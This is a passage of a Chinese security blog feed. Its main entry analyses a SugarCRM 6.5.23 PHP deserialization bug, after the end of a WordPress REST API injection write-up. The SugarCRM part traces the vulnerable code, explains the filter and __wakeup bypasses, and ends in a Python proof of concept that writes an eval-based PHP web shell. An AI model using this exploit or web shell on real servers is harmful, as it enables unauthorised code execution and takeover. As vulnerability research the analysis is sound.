src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045887686508.jpg" alt=""></p></li><li><p>测试：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045887924832.jpg" alt=""></p></li><li><p>测试结果：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045888358058.jpg" alt=""></p></li></ul><h2 id="多想了一下"><a href="#多想了一下" class="headerlink" title="多想了一下"></a>多想了一下</h2><p>乍一看，感觉这个洞并没有什么太大的影响，但是仔细想了一下，危害还是很大的。先不说WordPress页面执行php代码的各种插件，还有相当一部分的WordPress文章可以调用短代码的方式来输出特定的内容，以及向日志中添加内容，这是一个思路。</p><p>另一个思路就是可以进行对原来文章中的指定超链接进行修改，从而进行钓鱼。</p><p>还有一个思路，就是利用WordPress文章中解析html以及JavaScript文件包含的做法，辅助其他方法，进行攻击。</p><h1 id="0x03-diff比较"><a href="#0x03-diff比较" class="headerlink" title="0x03 diff比较"></a>0x03 diff比较</h1><p>对于该漏洞，关键的修改在<code>/wp-includes/class-wp-post.php</code>中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045888551118.jpg" alt=""></p><p>更改了对于<code>$post_id</code>的参数的传入顺序和判断条件，防止了我们传入数字+字母这样的格式进行绕过。</p><h1 id="0x04-修补方案"><a href="#0x04-修补方案" class="headerlink" title="0x04 修补方案"></a>0x04 修补方案</h1><p>将WordPress更新到最新版本。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-漏洞简述&quot;&gt;&lt;a href=&quot;#0x00-漏洞简述&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞简述&quot;&gt;&lt;/a&gt;0x00 漏洞简述&lt;/h1&gt;&lt;h2 id=&quot;1-漏洞简介&quot;&gt;&lt;a href=&quot;#1-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;1. 漏洞简介&quot;&gt;&lt;/a&gt;1. 漏洞简介&lt;/h2&gt;&lt;p&gt;在&lt;code&gt;REST API&lt;/code&gt;自动包含在&lt;code&gt;Wordpress4.7&lt;/code&gt;以上的版本，&lt;code&gt;WordPress REST API&lt;/code&gt;提供了一组易于使用的HTTP端点，可以使用户以简单的JSON格式访问网站的数据，包括用户，帖子，分类等。检索或更新数据与发送HTTP请求一样简单。上周，一个由&lt;code&gt;REST API&lt;/code&gt;引起的影响&lt;code&gt;WorePress4.7.0&lt;/code&gt;和&lt;code&gt;4.7.1&lt;/code&gt;版本的漏洞被披露，该漏洞可以导致WordPress所有文章内容可以未经验证被查看，修改，删除，甚至创建新的文章，危害巨大。&lt;/p&gt;
&lt;h2 id=&quot;2-漏洞影响版本&quot;&gt;&lt;a href=&quot;#2-漏洞影响版本&quot; class=&quot;headerlink&quot; title=&quot;2. 漏洞影响版本&quot;&gt;&lt;/a&gt;2. 漏洞影响版本&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;WordPress4.7.0&lt;/li&gt;
&lt;li&gt;WordPress4.7.1&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://lucifaer.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</title>
    <link href="https://lucifaer.com/2017/01/18/SugarCRM%20v6.5.23%20PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://lucifaer.com/2017/01/18/SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析/</id>
    <published>2017-01-17T16:23:44.000Z</published>
    <updated>2018-08-09T02:20:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>免费广告…..推荐使用<code>PHPSTORM+Xdebug</code>来分析漏洞，下面的过程都是利用<code>PHPSTORM</code>来分析的。</p><a id="more"></a><p>这个是个去年的洞，当时出了的时候就仔细看了一下<code>CVE-2016-7124</code>（后面的班级对抗赛还出了一个关于这个漏洞的题），但是没有仔细的分析过在<code>SugarCRM</code>中的触发过程，或许是当时有点忙吧，或许是自己从404回来后缺乏了及时分析漏洞的氛围，整天忙于较为鸡肋课业，导致昏昏沉沉的荒废了一个学期。寒假的时候突然想着把那些没有分析过的漏洞再分析一遍，算是弥补遗憾吧。</p><p>就像上面说的，这洞是去年九月份爆出来的，正规的分析文档可以看<a href="http://paper.seebug.org/39/" target="_blank" rel="noopener">由创宇小伙伴写的漏洞分析文档</a>。我下面写的是我个人对于这个漏洞的一点分析过程，主要是从漏洞挖掘和漏洞分析来看一下这个洞。</p><h1 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h1><h2 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h2><p>SugarCRM是一套开源的客户关系管理系统。在<code>&lt;6.5.23</code>版本中存在反序列化漏洞，攻击者可以通过构造恶意序列化数据，达到任意代码执行的目的。</p><h2 id="2-漏洞影响版本"><a href="#2-漏洞影响版本" class="headerlink" title="2. 漏洞影响版本"></a>2. 漏洞影响版本</h2><p>SugarCRM &lt;= 6.5.23<br>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p><h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><p><a href="http://paper.seebug.org/39/" target="_blank" rel="noopener">Dockerfile</a>看小伙伴的吧，拖到<code>phpstudy</code>里也行= =。</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h2 id="找到可控点"><a href="#找到可控点" class="headerlink" title="找到可控点"></a>找到可控点</h2><p>首先在<code>service/core/REST/SugarRestSerialize.php</code>中的<code>serve</code>函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">serve</span><span class="params">()</span></span>&#123;</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'Begin: SugarRestSerialize-&gt;serve'</span>);</span><br><span class="line">$data = !<span class="keyword">empty</span>($_REQUEST[<span class="string">'rest_data'</span>])? $_REQUEST[<span class="string">'rest_data'</span>]: <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_REQUEST[<span class="string">'method'</span>]) || !method_exists(<span class="keyword">$this</span>-&gt;implementation, $_REQUEST[<span class="string">'method'</span>]))&#123;</span><br><span class="line">$er = <span class="keyword">new</span> SoapError();</span><br><span class="line">$er-&gt;set_error(<span class="string">'invalid_call'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;fault($er);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$method = $_REQUEST[<span class="string">'method'</span>];</span><br><span class="line">$data = sugar_unserialize(from_html($data));</span><br><span class="line"><span class="keyword">if</span>(!is_array($data))$data = <span class="keyword">array</span>($data);</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'End: SugarRestSerialize-&gt;serve'</span>);</span><br><span class="line"><span class="keyword">return</span> call_user_func_array(<span class="keyword">array</span>( <span class="keyword">$this</span>-&gt;implementation, $method),$data);</span><br><span class="line">&#125; <span class="comment">// else</span></span><br><span class="line">&#125; <span class="comment">// fn</span></span><br></pre></td></tr></table></figure><p>在<code>$data = !empty($_REQUEST[&#39;rest_data&#39;])? $_REQUEST[&#39;rest_data&#39;]: &#39;&#39;;</code>传入可控参数，代码写的很简单，在传入<code>sugar_unserialize</code>方法前，首先将传入参数传入<code>from_html</code>方法中，而这个方法是用来进行编码转换的，可以看一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">from_html</span><span class="params">($string, $encode=true)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_string($string) || !$encode) &#123;</span><br><span class="line">        <span class="keyword">return</span> $string;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> $toHTML;</span><br><span class="line">    <span class="keyword">static</span> $toHTML_values = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">static</span> $toHTML_keys = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">static</span> $cache = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($toHTML) &amp;&amp; is_array($toHTML) &amp;&amp; (!<span class="keyword">isset</span>($toHTML_values) || !<span class="keyword">empty</span>($GLOBALS[<span class="string">'from_html_cache_clear'</span>]))) &#123;</span><br><span class="line">        $toHTML_values = array_values($toHTML);</span><br><span class="line">        $toHTML_keys = array_keys($toHTML);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bug 36261 - Decode &amp;amp; so we can handle double encoded entities</span></span><br><span class="line">$string = str_ireplace(<span class="string">"&amp;amp;"</span>, <span class="string">"&amp;"</span>, $string);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($cache[$string])) &#123;</span><br><span class="line">        $cache[$string] = str_ireplace($toHTML_values, $toHTML_keys, $string);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $cache[$string];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>小窍门，对于这样的方法，其实可以往上面翻一翻，看一看关于这个方法的注释….额，就是这样，直接过….</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Replaces specific HTML entity values with the true characters</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $string String to check/replace</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool $encode Default true</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>重点看一下<code>sugar_unserialize</code>方法，<code>PHPSTORM</code>的话，直接圈住这个方法名，<code>Command+B</code>就跳转到该方法了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Performs unserialization. Accepts all types except Objects</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $value Serialized value of any type except Object</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed False if Object, converted value for other cases</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sugar_unserialize</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $value, $matches);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count($matches)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> unserialize($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到注释中写到的是，（翻译）<code>执行反序列化。接受除对象外的所有类型</code>，读一下正则，可以看到只是过滤了<code>o:123</code>这样的形式，但是并没有过滤完整，可以通过<code>o:+123123</code>的方式绕过（<a href="http://139.129.31.35/index.php/archives/382/" target="_blank" rel="noopener">以前php4fun做过一道类似的</a>）</p><p>不难发现，如果我们想要利用这个漏洞，需要传入<code>rest_data</code>，<code>method</code>。<code>serve</code>函数的作用就是在实施代码的类中调用指定的方法，并且返回结果。</p><p>顺着这个思路找一下哪里调用我们的<code>serve</code>方法。这个时候看一下目录结构，发现我们找到的漏洞触发点在<code>/service/core/REST</code>目录下：<img src="media/14858321993840/1.png" alt="1"></p><p>打开<code>v2v3v4</code>中的一个目录中的<code>rest.php</code>文件，发现这是不同版本rest的入口文件，主要提供了<code>sugarcrm</code>的<code>webserver</code>服务。</p><blockquote><p>这边说的是看目录结构的思路，其实比较简单的方法就是全局搜索<code>service/core/</code>，来查看哪些地方<code>require</code>了该文件，配合查看目录结构，非常的方便。</p></blockquote><p>在这里我们可以想到整个<code>service</code>目录就是提供网络服务的目录，跟一下<code>rest.php</code>中的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'../..'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'SugarWebServiceImplv4.php'</span>);</span><br><span class="line">$webservice_class = <span class="string">'SugarRestService'</span>;</span><br><span class="line">$webservice_path = <span class="string">'service/core/SugarRestService.php'</span>;</span><br><span class="line">$webservice_impl_class = <span class="string">'SugarWebServiceImplv4'</span>;</span><br><span class="line">$registry_class = <span class="string">'registry'</span>;</span><br><span class="line">$location = <span class="string">'/service/v4/rest.php'</span>;</span><br><span class="line">$registry_path = <span class="string">'service/v4/registry.php'</span>;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'service/core/webservice.php'</span>);</span><br></pre></td></tr></table></figure><p>前面都是一些变量的初始化，直接跟进<code>service/core/webservice.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ob_start();</span><br><span class="line">chdir(dirname(<span class="keyword">__FILE__</span>).<span class="string">'/../../'</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'include/entryPoint.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'soap/SoapError.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'SoapHelperWebService.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'SugarRestUtils.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>($webservice_path);</span><br><span class="line"><span class="keyword">require_once</span>($registry_path);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($webservice_impl_class_path))</span><br><span class="line">    <span class="keyword">require_once</span>($webservice_impl_class_path);</span><br><span class="line">$url = $GLOBALS[<span class="string">'sugar_config'</span>][<span class="string">'site_url'</span>].$location;</span><br><span class="line">$service = <span class="keyword">new</span> $webservice_class($url);</span><br><span class="line">$service-&gt;registerClass($registry_class);</span><br><span class="line">$service-&gt;register();</span><br><span class="line">$service-&gt;registerImplClass($webservice_impl_class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// set the service object in the global scope so that any error, if happens, can be set on this object</span></span><br><span class="line"><span class="keyword">global</span> $service_object;</span><br><span class="line">$service_object = $service;</span><br><span class="line"></span><br><span class="line">$service-&gt;serve();</span><br></pre></td></tr></table></figure><p>根据前面的变量定义，这里我们可以明显的看出调用关系：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url = ip地址/service/v4/rest.php</span><br><span class="line">$service = <span class="keyword">new</span> SugarRestService($url)</span><br></pre></td></tr></table></figure><p>跟进<code>service/core/SugarRestService.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'Begin: SugarRestService-&gt;__construct'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;restURL = $url;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;responseClass = <span class="keyword">$this</span>-&gt;_getTypeName(@$_REQUEST[<span class="string">'response_type'</span>]);</span><br><span class="line"><span class="keyword">$this</span>-&gt;serverClass = <span class="keyword">$this</span>-&gt;_getTypeName(@$_REQUEST[<span class="string">'input_type'</span>]);</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'SugarRestService-&gt;__construct serverclass = '</span> . <span class="keyword">$this</span>-&gt;serverClass);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'service/core/REST/'</span>. <span class="keyword">$this</span>-&gt;serverClass . <span class="string">'.php'</span>);</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'End: SugarRestService-&gt;__construct'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下<code>_getTypeName</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_getTypeName</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($name)) <span class="keyword">return</span> <span class="string">'SugarRest'</span>;</span><br><span class="line"></span><br><span class="line">$name = clean_string($name, <span class="string">'ALPHANUM'</span>);</span><br><span class="line">$type = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">switch</span>(strtolower($name)) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'json'</span>:</span><br><span class="line">$type = <span class="string">'JSON'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'rss'</span>:</span><br><span class="line">$type = <span class="string">'RSS'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'serialize'</span>:</span><br><span class="line">$type = <span class="string">'Serialize'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">$classname = <span class="string">"SugarRest$type"</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="string">'service/core/REST/'</span> . $classname . <span class="string">'.php'</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'SugarRest'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $classname;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里可以通过构造<code>input_type = serialize</code>来使<code>$this-&gt;serverClass = SugarRestSerialize</code>，接下来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$service-&gt;registerClass($registry_class);</span><br><span class="line">$service-&gt;register();</span><br><span class="line">$service-&gt;registerImplClass($webservice_impl_class);</span><br></pre></td></tr></table></figure><p>将<code>SugarRestSerialize</code>类进行注册，在这三个函数调用的过程中在<code>registerImplClass</code>方法中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;server = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;serverClass(<span class="keyword">$this</span>-&gt;implementation);</span><br></pre></td></tr></table></figure><p>在最后调用<code>$service-&gt;serve();</code>中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">serve</span><span class="params">()</span></span>&#123;</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'Begin: SugarRestService-&gt;serve'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'service/core/REST/'</span>. <span class="keyword">$this</span>-&gt;responseClass . <span class="string">'.php'</span>);</span><br><span class="line">$response  = <span class="keyword">$this</span>-&gt;responseClass;</span><br><span class="line"></span><br><span class="line">$responseServer = <span class="keyword">new</span> $response(<span class="keyword">$this</span>-&gt;implementation);</span><br><span class="line"><span class="keyword">$this</span>-&gt;server-&gt;faultServer = $responseServer;</span><br><span class="line">$responseServer-&gt;faultServer = $responseServer;</span><br><span class="line">$responseServer-&gt;generateResponse(<span class="keyword">$this</span>-&gt;server-&gt;serve());</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'End: SugarRestService-&gt;serve'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>$responseServer-&gt;generateResponse($this-&gt;server-&gt;serve());</code>也就是调用了<code>SugarRestSerialize.php</code>中的<code>serve</code>方法，从而将我们构造好的序列化参数传递过去。</p><h2 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h2><p>从上面的分析中，我们已经知道了从哪里传入构造的序列化，传输过程。现在需要找的就是漏洞利用点，也就是漏洞触发点。</p><p>我们都知道现在只需要在序列化参数中传入需要反序列化的文件名，以及方法名，就可以将构造好的poc传递过去。</p><blockquote><p>关于找漏洞触发点，可以全局搜索危险函数名，以及通读代码来完成（耗费很多时间，并且没有一定的经验容易乱）。</p></blockquote><p>在<code>include/SugarCache/SugarCacheFile.php</code>找到漏洞利用点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">parent</span>::__destruct();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">$this</span>-&gt;_cacheChanged )</span><br><span class="line">        sugar_file_put_contents(sugar_cached(<span class="keyword">$this</span>-&gt;_cacheFileName), serialize(<span class="keyword">$this</span>-&gt;_localStore));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* This is needed to prevent unserialize vulnerability</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// clean all properties</span></span><br><span class="line">    <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"Not a serializable object"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在<code>__wakeup</code>魔术方法中，会将我们传递过来的数据清零，现在需要绕过该魔术方法，利用构造的序列化参数实现<code>__destrcut</code>中的写操作，绕过方法利用的就是<a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="noopener">CVE-2016-7124</a>。</p><p>在来看一下<code>sugar_file_put_contents</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sugar_file_put_contents</span><span class="params">($filename, $data, $flags=null, $context=null)</span></span>&#123;  </span><br><span class="line">    <span class="comment">//check to see if the file exists, if not then use touch to create it.</span></span><br><span class="line">    <span class="keyword">if</span>(!file_exists($filename))&#123;</span><br><span class="line">        sugar_touch($filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !is_writable($filename) ) &#123;</span><br><span class="line">        $GLOBALS[<span class="string">'log'</span>]-&gt;error(<span class="string">"File $filename cannot be written to"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($flags)) &#123;</span><br><span class="line">        <span class="keyword">return</span> file_put_contents($filename, $data);</span><br><span class="line">    &#125; <span class="keyword">elseif</span>(<span class="keyword">empty</span>($context)) &#123;</span><br><span class="line">        <span class="keyword">return</span> file_put_contents($filename, $data, $flags);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_put_contents($filename, $data, $flags, $context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数并没有对文件内容或者扩展名等进行限制，虽然参数<code>$data</code>是serialize(<code>$this-&gt;_localStore</code>)，也就是序列化后的数据，但是我们可以设置<code>$_this-&gt;_localStore</code>为一个数组，把payload作为数组中的一个值，就可以完整保存payload。（反正就是执行一个写操作，php序列化数组后并不会对数组的值进行干扰）</p><p>所以，传入一个<code>SugarCacheFile</code>对象，并设置其属性的值，就能进行写文件操作。</p><p>demo的话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests as req</span><br><span class="line"></span><br><span class="line">url = &apos;http://127.0.0.1:8788/service/v4/rest.php&apos;</span><br><span class="line"></span><br><span class="line">data = &#123;  </span><br><span class="line">    &apos;method&apos;: &apos;login&apos;,</span><br><span class="line">    &apos;input_type&apos;: &apos;Serialize&apos;,</span><br><span class="line">    &apos;rest_data&apos;: &apos;O:+14:&quot;SugarCacheFile&quot;:23:&#123;S:17:&quot;\\00*\\00_cacheFileName&quot;;s:15:&quot;../custom/shell.php&quot;;S:16:&quot;\\00*\\00_cacheChanged&quot;;b:1;S:14:&quot;\\00*\\00_localStore&quot;;a:1:&#123;i:0;s:29:&quot;&lt;?php eval($_POST[\&apos;Lucifaer\&apos;]); ?&gt;&quot;;&#125;&#125;&apos;,</span><br><span class="line">&#125;</span><br><span 